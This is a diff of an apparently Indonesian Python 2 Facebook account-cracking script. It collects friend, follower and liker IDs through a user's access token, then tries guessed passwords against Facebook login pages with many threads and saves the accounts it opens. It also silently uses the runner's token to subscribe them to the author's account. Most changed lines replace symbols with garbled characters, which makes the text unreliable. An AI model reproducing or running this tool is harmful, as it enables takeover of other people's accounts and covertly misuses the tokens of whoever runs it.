@@ -4,7 +4,6 @@ import requests,sys,random,re,base64,json
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from bs4 import BeautifulSoup as parser
-from menu_instagram import menu_instagram
 from urllib2 import urlopen
 from cek_opsi import cek_opsi
 reload(sys)
@@ -27,11 +26,11 @@ logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
 \x1b[1;92m| _ \ _ \ __|  \/  |_ _| | | |  \/  |
 \x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
 \x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_|
-\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : rozhak
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/rozhak.xyz
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/rozhakxd
-\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
+\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m覧覧覧覧覧覧覧覧覧覧覧覧覧覧覧
+\x1b[1;95m[\x1b[1;97m表x1b[1;95m]\x1b[1;97m au : rozhak
+\x1b[1;95m[\x1b[1;97m表x1b[1;95m]\x1b[1;97m fb : fb.com/rozhak.xyz
+\x1b[1;95m[\x1b[1;97m表x1b[1;95m]\x1b[1;97m gh : github.com/rozhakxd
+\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m覧覧覧覧覧覧覧覧覧覧覧覧覧覧覧
 """)
 url=('http://ipinfo.io/json')
 response=urlopen(url)
@@ -51,7 +50,7 @@ def login():
 	print("\x1b[1;92m[\x1b[1;93m0\x1b[1;92m]\x1b[1;93m Keluar")
 	login = raw_input("\n\x1b[1;92m[\x1b[1;97m#\x1b[1;92m] Choose :\x1b[1;96m ")
 	if login == "":
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mWrong Input")
+		exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m] \x1b[1;91mWrong Input")
 	elif login == "1":
                 try:
 			token=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Token :\x1b[1;92m ")
@@ -63,7 +62,7 @@ def login():
                         save.close()
                         bot_follow()
                 except KeyError:
-                        exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Salah")
+                        exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Token Salah")
 	elif login == "2":
 		print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Anda Akan Diarahkan Ke Browser")
 		time.sleep(3)
@@ -72,23 +71,23 @@ def login():
 	elif login == "0":
 		exit()
 	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Wrong Input")
 def bot_follow():
 	try:
 		token=open('___rozhak___','r').read()
 	except IOError:
-		print ("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mCookie Invalid")
+		print ("\x1b[1;93m[\x1b[1;91m表x1b[1;93m] \x1b[1;91mCookie Invalid")
 		os.system('rm -rf ___rozhak___')
 		time.sleep(2)
 		login()
 	web = datetime.datetime.now()
         waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
-        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
+        love = random.choice(['','','','','','',''])
 	kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
 	kata_utama = ("Pengguna Script Premium ")
 	komen = kata_utama+love+"\n"+kata_kata_cinta+"\n"+waktu
 	kata_mutiara_islam = random.choice(["Kita tidak akan pernah tahu bagimana menyembahNya sebelum kita mulai dengan bagaimana mencintaiNya.","Apakah engkau meremehkan suatu doa kepada Allah, apakah engkau tahu keajaiban dan kemukjizatan doa? Ibarat panah dimalam hari, ia tidak akan meleset namun ia punya batas dan setiap batas ada saatnya untuk selesai.","Jangan berjalan dimuka bumi dengan penuh kesombongan dan congkak karena sebentar lagi engkau akan masuk ke dalam bumi juga.","Barang siapa yang bersungguh-sungguh berjalan pada jalannya maka pasti ia akan sampai pada tujuannya.","Ilmu pengetahuan di waktu kecil itu bagaikan ukiran di atas batu.","Bukanlah anak yatim itu yang telah meninggal orangtuanya, tetapi sesungguhnya yatim itu adalah yatim ilmu dan akhlak.","Ilmu tanpa agama adalah suatu kecacatan, dan agama tanpa ilmu merupakan kebutaan","Kegagalan adalah cara Allah untuk mengatakan bersabarlah karena aku memiliki sesuatu yang lebih baik untukmu saat waktunya tiba.","Kita tidak akan pernah kalah sampai kita menyerahkan semuanya kepada Tuhan.","Bagimu agamamu, bagiku agamaku. Karena sesungguhnya tidaka ada paksaan dalam beragama.","Sabar dan bisa mengikhlaskan sesuatu yang telah pergi adalah salah satu cara untuk mendapatkan kebahagian."])
-	kata_utama2 = random.choice(["Hai Bang 😎","Hello Bang 😎","Hello Bro 😎","Hai Bro 😎"])
+	kata_utama2 = random.choice(["Hai Bang ","Hello Bang ","Hello Bro ","Hai Bro "])
 	komen2 = kata_utama2+"\n"+kata_mutiara_islam+"\n"+waktu
 	pantun_motivasi = random.choice(["Jalan-jalan naik kereta, Naik ke atas pakai tangga. Mari kita gapai cita-cita, Bahagia dunia, masuk ke surga.","Pisau tajam dari baja, Parang panjang banyak guna. Membayar sukses dengan kerja, Bayar sekarang, kelak bahagia.","Sampan sudah, rakit sudah, Yang belum hanya bahteranya. Sarapan sudah, ngopi sudah, Yang belum tinggal kerjanya.","Kapas terhembus angin ringan, Sejuk terasa angin pantai. Lebih bahagia dalam perjuangan, Daripada dalam santai-santai."])
 	kata_utama3 = ("I love you @[757953543:]")
@@ -107,7 +106,7 @@ def publik():
         try:
                 token=open('___rozhak___','r').read()
         except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookies Invalid')
+                print('\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Cookies Invalid')
                 os.system('rm -rf ___rozhak___')
                 time.sleep(2)
                 login()
@@ -119,7 +118,7 @@ def publik():
                         op = json.loads(req.text)
                         print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama :\x1b[1;96m "+op["name"])
                 except KeyError:
-                        print('\x1b[1;91m[\x1b[1;93m•\x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
+                        print('\x1b[1;91m[\x1b[1;93m表x1b[1;92m]\x1b[1;93m Profil Tidak Ditemukan')
                         raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                         menu()
                 r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(9999999)&access_token="+token)
@@ -138,16 +137,16 @@ def publik():
                 menu()
 
         except KeyError:
-                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
+                print('\n\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
                 raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m]\x1b[1;93m Koneksi Error")
+		exit("\x1b[1;97m[\x1b[1;93m表x1b[1;97m]\x1b[1;93m Koneksi Error")
 def like_post():
         try:
                 token=open('___rozhak___','r').read()
         except IOError:
-		print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
+		print('\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Cookie Invalid')
                 os.system('rm -rf ___rozhak___')
                 time.sleep(2)
                 login()
@@ -157,7 +156,7 @@ def like_post():
                 try:
                    r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=99999999&access_token="+token);requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                 except KeyError:
-			print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Post ID Tidak Ada')
+			print('\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Post ID Tidak Ada')
 			raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                         menu()
                 id = []
@@ -175,12 +174,12 @@ def like_post():
 		menu()
 
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Koneksi Error")
+		exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Koneksi Error")
 def follower():
         try:
                 token=open('___rozhak___','r').read()
         except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
+                print('\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Cookie Invalid')
                 os.system('rm -rf ___rozhak___')
                 time.sleep(2)
                 login()
@@ -192,7 +191,7 @@ def follower():
                         op = json.loads(req.text)
                         print("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama : \x1b[1;96m"+op["name"])
                 except KeyError:
-                        print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Profil Tidak Ditemukan')
+                        print('\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Profil Tidak Ditemukan')
                         raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                         menu()
 		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=9999999")
@@ -211,16 +210,16 @@ def follower():
                 menu()
 
         except KeyError:
-                print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Follower')
+                print('\n\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Tidak Ada Follower')
                 raw_input('\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}')
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
+		exit("\x1b[1;91m[\x1b[1;93m表x1b[1;91m]\x1b[1;93m Koneksi Error")
 def teman():
         try:
                 token=open('___rozhak___','r').read()
         except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
+                print('\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Cookie Invalid')
                 os.system('rm -rf ___rozhak___')
                 time.sleep(2)
                 login()
@@ -229,7 +228,7 @@ def teman():
                 try:
                    r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/757953543/subscribers?access_token='+token)
                 except KeyError:
-                        print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
+                        print('\n\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
                         raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                         menu()
                 id = []
@@ -246,13 +245,13 @@ def teman():
                 raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
+		exit("\x1b[1;91m[\x1b[1;93m表x1b[1;91m]\x1b[1;93m Koneksi Error")
 def menu():
 	global ip, org
 	try:
 		token=open('___rozhak___','r').read()
 	except IOError:
-		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
+		print("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Cookie Invalid")
 		os.system('rm -rf ___rozhak___')
 		time.sleep(2)
 		login()
@@ -261,12 +260,12 @@ def menu():
 		a = json.loads(otw.text)
 		nama = a['name']
 	except KeyError:
-		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
+		print("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Cookie Invalid")
 		os.system('rm -rf ___rozhak___')
 		time.sleep(2)
 		login()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
+		exit("\x1b[1;91m[\x1b[1;93m表x1b[1;91m]\x1b[1;93m Koneksi Error")
 	os.system("clear")
 	print(logo)
 	print("\x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Name : "+nama)
@@ -287,7 +286,7 @@ def menu():
 def daftar_menu():
 	pilih = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
 	if pilih == "":
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Wrong Input")
 	elif pilih == "1":
 		menu_instagram()
 	elif pilih == "2":
@@ -308,27 +307,27 @@ def daftar_menu():
 		print("\x1b[1;96m[\x1b[1;97m0\x1b[1;96m]\x1b[1;97m Kembali")
 		lihat = raw_input("\n\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;96m ")
 		if lihat == "":
-			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+			exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Wrong Input")
 		elif lihat == "1":
 			try:
 				live=open('Live.txt','r').read()
 			except IOError:
-				exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Ok Tidak Ada")
+				exit("\x1b[1;91m[\x1b[1;93m表x1b[1;91m]\x1b[1;93m Hasil Ok Tidak Ada")
 			print("\x1b[1;92m"+live)
 			exit()
 		elif lihat == "2":
 			try:
                                 chek=open('Check.txt','r').read()
                         except IOError:
-                                exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Hasil Cp Tidak Ada")
+                                exit("\x1b[1;91m[\x1b[1;93m表x1b[1;91m]\x1b[1;93m Hasil Cp Tidak Ada")
                         print("\x1b[1;93m"+chek)
 			exit()
 		elif lihat == "0":
 			menu()
 		else:
-			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+			exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Wrong Input")
 	elif pilih == "9":
-		print("\x1b[1;92m[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
+		print("\x1b[1;92m[\x1b[1;97m表x1b[1;92m]\x1b[1;97m Anda Akan Diarahkan Ke Whatsapp")
 		time.sleep(3)
 		os.system("xdg-open https://wa.me/6285727173376?text=Hallo%20Bang%20Rozhak")
 		exit()
@@ -337,16 +336,16 @@ def daftar_menu():
 			print("\x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Menghapus Cookie & Token")
 			os.remove("___rozhak___")
 		except Exception as e:
-			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+			exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Ada")
 	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Wrong Input")
 def metode():
 	print("\n\x1b[1;92m[\x1b[1;97m1\x1b[1;92m]\x1b[1;97m Metode mbasic.facebook.com")
 	print("\x1b[1;92m[\x1b[1;97m2\x1b[1;92m]\x1b[1;97m Metode free.facebook.com")
 	print("\x1b[1;92m[\x1b[1;97m3\x1b[1;92m]\x1b[1;97m Metode mobile.facebook.com")
 	metode=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Choose :\x1b[1;92m ")
 	if metode == '':
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Wrong Input")
 	elif metode == '1':
 		crack()
 	elif metode == '2':
@@ -354,7 +353,7 @@ def metode():
 	elif metode == '3':
 		crack3()
 	else:
-		exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Wrong Input")
+		exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m Wrong Input")
 def generate(text):
 	global country
 	results=[]
@@ -507,7 +506,7 @@ class crack:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -515,7 +514,7 @@ class crack:
 							self.fl.append({"id":i.split("<=>")[0]})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
 				self.pwlist()
@@ -528,7 +527,7 @@ class crack:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -536,7 +535,7 @@ class crack:
 							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
 				ThreadPool(35).map(self.main,self.fl)
@@ -606,7 +605,7 @@ class crack2:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -614,7 +613,7 @@ class crack2:
 							self.fl.append({"id":i.split("<=>")[0]})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
 				self.pwlist()
@@ -627,7 +626,7 @@ class crack2:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -635,7 +634,7 @@ class crack2:
 							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
 				ThreadPool(35).map(self.main,self.fl)
@@ -705,7 +704,7 @@ class crack3:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -713,7 +712,7 @@ class crack3:
 							self.fl.append({"id":i.split("<=>")[0]})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Contoh Password :\x1b[1;92m Sayang,Bangsat,123456")
 				self.pwlist()
@@ -726,7 +725,7 @@ class crack3:
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
-							exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
+							exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Ada")
 							continue
 					self.fl=[]
 					for i in self.fs:
@@ -734,7 +733,7 @@ class crack3:
 							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
 						except:continue
 				except Exception as e:
-					exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Valid")
+					exit("\x1b[1;93m[\x1b[1;91m表x1b[1;93m]\x1b[1;91m File Tidak Valid")
 					continue
 				print("\x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m Mainkan Mode Pesawat Jika Tidak Ada Hasil\n")
 				ThreadPool(35).map(self.main,self.fl)
